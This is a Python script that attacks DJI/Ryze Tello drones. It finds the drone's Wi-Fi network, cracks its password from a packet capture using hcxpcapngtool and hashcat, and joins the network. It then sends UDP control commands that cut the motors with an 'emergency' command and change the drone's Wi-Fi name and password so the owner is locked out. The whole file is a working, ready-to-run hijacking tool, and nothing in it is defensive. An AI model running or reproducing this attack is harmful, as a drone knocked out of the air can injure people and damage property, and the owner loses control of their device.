import subprocess
import socket
import time

file = "/root/Drone/sampleCap.pcapng*" #pcapng file (hcxdumptool)
wlist = "/root/Drone/sampleDict.txt" #Word List
wifiKeyword = "TELLO"
target = ""

def on_managed():
    try:
        on_managed_c = """systemctl start NetworkManager wpa_supplicant && 
        ip link set wlan0 down && 
        iw dev wlan0 set type managed && 
        ip link set wlan0 up"""
        subprocess.run(on_managed_c, shell=True)
        print("[*] Interface Set")
    except Exception as e:
        print("Error: ", {e})

def acquire_target():
    try:
        scan_c = "iw dev wlan0 scan | grep -i '"+ wifiKeyword + "' -B 10 | grep -o -E '([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}'"
        scan = subprocess.run(scan_c, capture_output=True, text=True, shell=True)
        target_address = scan.stdout[0:17]
        print("[+] BSSID Obtained")
        global target
        target = target_address
    except subprocess.CalledProcessError as e:
        print(f"Error: {e}")
        print(f"Output: {e.output}")

def connectToTarget(target, password=""):
    try:
        utarget = target.upper()
        print(f"[+] Connecting to Wi-Fi network: {target}")
        command = f'nmcli device wifi connect "{utarget}" password "{password}"'
        subprocess.run(command, shell=True, check=True)
        print(f"[+] Connected to Wi-Fi network: {target}")
    except Exception as e:
        print(f"Error occurred: {e}")

def wifi_config(command_socket, command_addr):
    ssid="Shrimp-WHAT"
    password='Cappucino123'
    command = "wifi " + ssid + " " + password
    command_socket.sendto(command.encode(), command_addr)
#    print("WIFI SSID and password changed to: ", ssid + ", ", password)

def emergency(command_socket, command_addr):
    #command = emergency 
    command_socket.sendto(b"emergency" , command_addr)
    print ("[+] Motor Functions Stopped. LOL!")

def get_hash():
    try:
        cmd = "hcxpcapngtool -o capHash.22000 " + file
        subprocess.run(cmd, shell=True)
        print("[+] Hashes Acquired")
    except Exception as e:
        print("Error", {e})

def crack():
    try:
        hc = "hashcat --quiet -m 22000 capHash.22000 " + wlist
        #print(hc)
        print("[+] Cracking")
        subprocess.run(hc, shell=True)
        print("[+] CRACKED!")
        print("=" * 20)
    except Exception as e:
        print("Error", {e})

def show_crack():
    try:
        show_crack = "hashcat -m 22000 capHash.22000 --show | cut -d ':' -f 5 | head -1"
        thing = subprocess.run(show_crack, capture_output=True, text=True, shell=True)
        result = thing.stdout
        pw = result.strip()
        return pw
    except Exception as e:
        print("Error", {e})

def check_pw():
    try:
        pwCheck = "iwlist wlan0 scan | grep -i '" + wifiKeyword + "' -A 4 | grep -i 'Encryption'" 
        output = subprocess.run(pwCheck, capture_output=True, text=True, shell=True)
        result = output.stdout
        if "Encryption key:on" in result.strip():
            global target
            get_hash()
            crack()
            connectToTarget(target, show_crack())
        else:
            connectToTarget(target)
    except subprocess.CalledProcessError as e:
        print("Error ", {e})

def camera(): #Not in use
    try:
        stream_c = "ffmpeg -i udp://192.168.10.1:11111 -f sdl 'Why the fk you looking here bro?'"
        subprocess.run(stream_c, shell=True)
        print("[+]Live feed started")
    except subprocess.CalledProcessError as e:
        print(f"Error: {e}")
        print(f"Output: {e.output}")

def main():
    on_managed()
    acquire_target()
    check_pw()
    command_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    command_addr = ('192.168.10.1', 8889)
    command_socket.bind(('',8889))
    command_socket.sendto(b"command", command_addr)
    command_socket.recvfrom(1024)
    print("[+] Control Taken")
    time.sleep(3)
    emergency(command_socket, command_addr)
    time.sleep(3)
    wifi_config(command_socket, command_addr)

main()
